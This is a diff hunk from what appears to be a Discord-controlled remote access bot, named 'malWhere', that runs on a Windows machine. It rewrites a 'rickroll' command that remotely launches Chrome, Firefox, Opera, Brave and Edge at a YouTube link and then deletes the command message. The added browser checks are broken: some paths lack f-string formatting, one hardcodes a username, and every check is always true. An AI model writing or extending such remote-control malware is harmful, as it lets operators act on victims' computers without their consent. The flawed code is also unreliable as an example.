@@ -125,10 +125,26 @@ async def pcinfo(ctx):
 @malWhere.command()
 async def rickroll(ctx):
   try:
-    os.popen("start chrome.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-    os.popen("start firefox.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-    os.popen("start opera.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-    os.popen("start brave.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    existing_chrome="C:/Users/{getpass.getuser()}/AppData/Local/Google/Chrome"
+    if existing_chrome:
+      os.popen("start chrome.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+      
+    existing_opera=f"C:/Users/{getpass.getuser()}/AppData/Local/Opera Software"
+    if existing_opera:
+      os.popen("start opera.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+      
+    existing_firefox="C:/Users/{getpass.getuser()}/AppData/Local/Mozilla/Firefox"
+    if existing_firefox:
+      os.popen("start firefox.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+      
+    existing_brave="C:/Users/jorda/AppData/Local/BraveSoftware/Brave-Browser"
+    if existing_brave:
+      os.popen("start brave.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+      
+    existing_edge="C:/Users/{getpass.getuser()}/AppData/Local/Microsoft/Edge"
+    if existing_edge:
+      os.popen("start MicrosoftEdge.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+      
     await ctx.message.delete()
   except:
     ctx.message.send("An Error Has Occured Please Try Again")
